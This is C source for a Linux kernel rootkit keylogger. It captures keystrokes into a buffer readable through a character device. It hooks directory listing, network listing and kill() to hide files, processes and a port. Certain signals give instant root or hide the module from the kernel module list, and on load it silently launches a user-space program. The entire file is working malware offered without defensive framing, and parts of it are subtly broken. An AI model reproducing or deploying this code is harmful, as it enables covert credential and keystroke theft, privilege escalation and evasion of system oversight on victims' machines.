#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/keyboard.h>
#include <linux/notifier.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/init.h>
#include <linux/kallsyms.h>
#include <linux/namei.h>
#include <linux/tcp.h>
#include "ftrace_helper.h"
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/version.h>
#include <linux/debugfs.h>
#include <linux/kmod.h>
#include <linux/list.h>
#include <linux/kobject.h>
static struct list_head *prev_module;
static struct kobject *prev_kobj;
static short hidden = 0;

MODULE_DESCRIPTION("");
MODULE_AUTHOR("");
MODULE_LICENSE("GPL");

#define DEVICE_NAME "kl0"
u32 major;
char* major_string[10];

static char* target_process = "/etc/keylog/manager.o";
static struct dentry *subdir;

#ifndef BUFLEN
#define BUFLEN 1024
#endif
static char input_buf[BUFLEN];
unsigned buf_count = 0;
static int kl_notifier_call(struct notifier_block *, unsigned long, void *);
static ssize_t kl_device_read(struct file *, char __user *, size_t, loff_t *);

static struct notifier_block kl_notifier_block = { .notifier_call =
							   kl_notifier_call };

static struct file_operations fops = { .read = kl_device_read };

static unsigned long * __force_order;

void showme(void)
{
	hidden=0;
    list_add(&THIS_MODULE->list, prev_module);
	kobject_add(&THIS_MODULE->mkobj.kobj, prev_kobj, "NULL");
	list_add(&THIS_MODULE->mkobj.kobj.entry, &(prev_kobj->entry));
}

void hideme(void)
{
	hidden=1;
    prev_module = THIS_MODULE->list.prev;
	prev_kobj = &THIS_MODULE->mkobj.kobj;
    list_del(&THIS_MODULE->list);
	kobject_del(&THIS_MODULE->mkobj.kobj);
	list_del(&THIS_MODULE->mkobj.kobj.entry);
}

#define PREFIX "keylog"

#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif

char hide_pid[NAME_MAX];
int hide_port = -1;
int port = 0000;

void set_root(void)
{
    struct cred *root;
    root = prepare_creds();

    if (root == NULL)
        return;

    root->uid.val = root->gid.val = 0;
    root->euid.val = root->egid.val = 0;
    root->suid.val = root->sgid.val = 0;
    root->fsuid.val = root->fsgid.val = 0;

    commit_creds(root);
}

static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);

static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v)
{
    struct inet_sock *is;
    long ret;
    unsigned short port_ton = htons(port);

    if (v != SEQ_START_TOKEN) {
		is = (struct inet_sock *)v;
		if (hide_port != -1 && (port_ton == is->inet_sport || port_ton == is->inet_dport)) {
            #ifdef DEBUG
			printk(KERN_DEBUG "rootkit: sport: %d, dport: %d\n",
				   ntohs(is->inet_sport), ntohs(is->inet_dport));
            #endif
			return 0;
		}
	}

	ret = orig_tcp4_seq_show(seq, v);
	return ret;
}
#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage long (*orig_kill)(const struct pt_regs *);
static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
static asmlinkage long (*orig_getdents)(const struct pt_regs *);

asmlinkage int hook_getdents64(const struct pt_regs *regs)
{
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;

    long error;

    struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;

    int ret = orig_getdents64(regs);
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    if ( (ret <= 0) || (dirent_ker == NULL) )
        return ret;

    error = copy_from_user(dirent_ker, dirent, ret);
    if (error)
        goto done;

    while (offset < ret)
    {
        current_dir = (void *)dirent_ker + offset;

        if ( memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0  || ((memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) && (strncmp(hide_pid, "", NAME_MAX) != 0)))
        {
            if ( current_dir == dirent_ker )
            {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            previous_dir->d_reclen += current_dir->d_reclen;
        }
        else
        {
            previous_dir = current_dir;
        }

        offset += current_dir->d_reclen;
    }

    error = copy_to_user(dirent, dirent_ker, ret);
    if (error)
        goto done;

done:
    kfree(dirent_ker);
    return ret;

}

asmlinkage int hook_getdents(const struct pt_regs *regs)
{
    struct linux_dirent {
        unsigned long d_ino;
        unsigned long d_off;
        unsigned short d_reclen;
        char d_name[];
    };

    struct linux_dirent *dirent = (struct linux_dirent *)regs->si;

    long error;

    struct linux_dirent *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;

    int ret = orig_getdents(regs);
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    if ( (ret <= 0) || (dirent_ker == NULL) )
        return ret;

    error = copy_from_user(dirent_ker, dirent, ret);
    if (error)
        goto done;

    while (offset < ret)
    {
        current_dir = (void *)dirent_ker + offset;

        if ( memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0 || ((memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) && (strncmp(hide_pid, "", NAME_MAX) != 0)))
        {
            if ( current_dir == dirent_ker )
            {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            previous_dir->d_reclen += current_dir->d_reclen;
        }
        else
        {
            previous_dir = current_dir;
        }

        offset += current_dir->d_reclen;
    }
    error = copy_to_user(dirent, dirent_ker, ret);
    if (error)
        goto done;

done:
    kfree(dirent_ker);
    return ret;

}

asmlinkage int hook_kill(const struct pt_regs *regs)
{
    pid_t pid = regs->di;
    int sig = regs->si;

    switch(sig) {
		case 64:
        #ifdef DEBUG
			printk(KERN_INFO "rootkit: hiding process with pid %d\n", pid);
            #endif
			sprintf(hide_pid, "%d", pid);
			return 0;
		case 87: 
			port = pid;
			return 0;
	    case 94: 
			buf_count = 0;
			memset(input_buf, 0, BUFLEN);
			return 0;
		case 52:
        #ifdef DEBUG
			printk(KERN_INFO "rootkit: giving root...\n");
            #endif
			set_root();
			return 0;
        case 34:
            if (hidden == 0) {hideme(); return 0;}
            else {showme(); return 0;}
		default:
			return orig_kill(regs);
	}
}
#else
static asmlinkage long (*orig_getdents64)(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count);
static asmlinkage long (*orig_getdents)(unsigned int fd, struct linux_dirent *dirent, unsigned int count);
static asmlinkage long (*orig_kill)(pid_t pid, int sig);
static asmlinkage int hook_getdents64(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count)
{
    struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;
    int ret = orig_getdents64(fd, dirent, count);
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    if ( (ret <= 0) || (dirent_ker == NULL) )
        return ret;

    long error;
        error = copy_from_user(dirent_ker, dirent, ret);
    if (error)
        goto done;

    while (offset < ret)
    {
        current_dir = (void *)dirent_ker + offset;
        if ( memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0 || ((memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) && (strncmp(hide_pid, "", NAME_MAX) != 0)))
        {
            if ( current_dir == dirent_ker )
            {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            previous_dir->d_reclen += current_dir->d_reclen;
        }
        else
        {
            previous_dir = current_dir;
        }

        offset += current_dir->d_reclen;
    }
    error = copy_to_user(dirent, dirent_ker, ret);
    if (error)
        goto done;

done:
    kfree(dirent_ker);
    return ret;
}

static asmlinkage int hook_getdents(unsigned int fd, struct linux_dirent *dirent, unsigned int count)
{
    struct linux_dirent {
        unsigned long d_ino;
        unsigned long d_off;
        unsigned short d_reclen;
        char d_name[];
    };
    struct linux_dirent *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;

    int ret = orig_getdents(fd, dirent, count);
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    if ( (ret <= 0) || (dirent_ker == NULL) )
        return ret;

    long error;
        error = copy_from_user(dirent_ker, dirent, ret);
    if (error)
        goto done;

    while (offset < ret)
    {
        current_dir = (void *)dirent_ker + offset;

        if ( memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0 || ((memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) && (strncmp(hide_pid, "", NAME_MAX) != 0)))
        {
            if ( current_dir == dirent_ker )
            {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            previous_dir->d_reclen += current_dir->d_reclen;
        }
        else
        {
            previous_dir = current_dir;
        }

        offset += current_dir->d_reclen;
    }

    error = copy_to_user(dirent, dirent_ker, ret);
    if (error)
        goto done;

done:
    kfree(dirent_ker);
    return ret;
}
asmlinkage int hook_kill(pid_t pid, int sig)
{
    switch(sig) {
		case 64:
            #ifdef DEBUG
			printk(KERN_INFO "rootkit: hiding process with pid %d\n", pid);
            #endif
			sprintf(hide_pid, "%d", pid);
			return 0;
		case 87: 
			port = pid;
			return 0;
	    case 94: 
			buf_count = 0;
			memset(input_buf, 0, BUFLEN);
			return 0;
		case 52:
            #ifdef DEBUG
			printk(KERN_INFO "rootkit: giving root...\n");
            #endif
			set_root();
			return 0;
        case 34:
            if (hidden == 0) {hideme(); return 0;}
            else {showme(); return 0;}
		default:
			return orig_kill(regs);
	}
}
#endif

static int kl_notifier_call(struct notifier_block *nb, unsigned long action,
			    void *data)
{
	struct keyboard_notifier_param *param = data;
	char c = param->value;

	if (!param->down || action != KBD_KEYSYM) {
		return NOTIFY_DONE;
	}

	if (c == 0x01) {
		input_buf[buf_count++] = 0x0a;
	} else if (c >= 0x20 && c < 0x7f) {
		input_buf[buf_count++] = c;
	}

	if (buf_count >= BUFLEN) {
		buf_count = 0;
		memset(input_buf, 0, BUFLEN);
	}

	return NOTIFY_OK;
}

static ssize_t kl_device_read(struct file *fp, char __user *buf, size_t len,
			      loff_t *offset)
{
	size_t buflen = strlen(input_buf);
	int ret;

	ret = copy_to_user(buf, input_buf, buflen);
	if (ret) {
        #ifdef DEBUG
		printk(KERN_ERR
		       "keylog: Unable to copy from kernel buffer to user space buffer\n");
               #endif
		return -ret;
	}

	memset(input_buf, 0, BUFLEN);
	buf_count = 0;

	return buflen;
}



inline void cr0_write(unsigned long cr0)
{
    asm volatile("mov %0,%%cr0" : "+r"(cr0), "+m"(__force_order));
}

static inline void protect_memory(void)
{
    unsigned long cr0 = read_cr0();
    set_bit(16, &cr0);
    cr0_write(cr0);
}

static inline void unprotect_memory(void)
{
    unsigned long cr0 = read_cr0();
    clear_bit(16, &cr0);
    cr0_write(cr0);
}

static struct ftrace_hook hooks[] = {
	HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
	HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
    HOOK("__x64_sys_getdents", hook_getdents, &orig_getdents),
    HOOK("__x64_sys_kill", hook_kill, &orig_kill),
};

static int spawnProcess(char* path) {

    int rc;
	char* argv[] = {path, NULL};
	static char* envp[] = {
		"HOME=/",
		"TERM=linux",
		"PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
        
	rc = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    #ifdef DEBUG
	printk("RC is: %i \n", rc);
    #endif
	return rc;
}

static int __init kl_init(void)
{
	int i;
	int err;
	int ret;
    subdir = debugfs_create_dir("keylog", NULL);
	if (IS_ERR(subdir))
		return PTR_ERR(subdir);
	if (!subdir)
		return -ENOENT;

	debugfs_create_u32("major", 0400, subdir, &major);
	ret = register_chrdev(0, DEVICE_NAME, &fops);
	if (ret < 0) {
        #ifdef DEBUG
		printk(KERN_ERR
		       "keylog: Unable to register character device\n");
        #endif
		return ret;
	}
	major = ret;
    #ifdef DEBUG
	printk(KERN_INFO "keylog: Registered device major number %u\n", major);
    #endif
	protect_memory();
	ret = register_keyboard_notifier(&kl_notifier_block);
	err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
	if(err)
		return err;
	unprotect_memory();
	if (ret) {
        #ifdef DEBUG
		printk(KERN_ERR
		       "keylog: Unable to register keyboard notifier\n");
        #endif
		return -ret;
	}
	i = spawnProcess(target_process);
    #ifdef DEBUG
    printk(KERN_INFO "keylog: return value %d\n",i);
    #endif

	memset(input_buf, 0, BUFLEN);

	hideme();

	return 0;
}

static void __exit kl_exit(void)
{
	protect_memory();
	unregister_chrdev(major, DEVICE_NAME);
	unregister_keyboard_notifier(&kl_notifier_block);
	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
	unprotect_memory();
    debugfs_remove_recursive(subdir);
}

module_init(kl_init);
module_exit(kl_exit);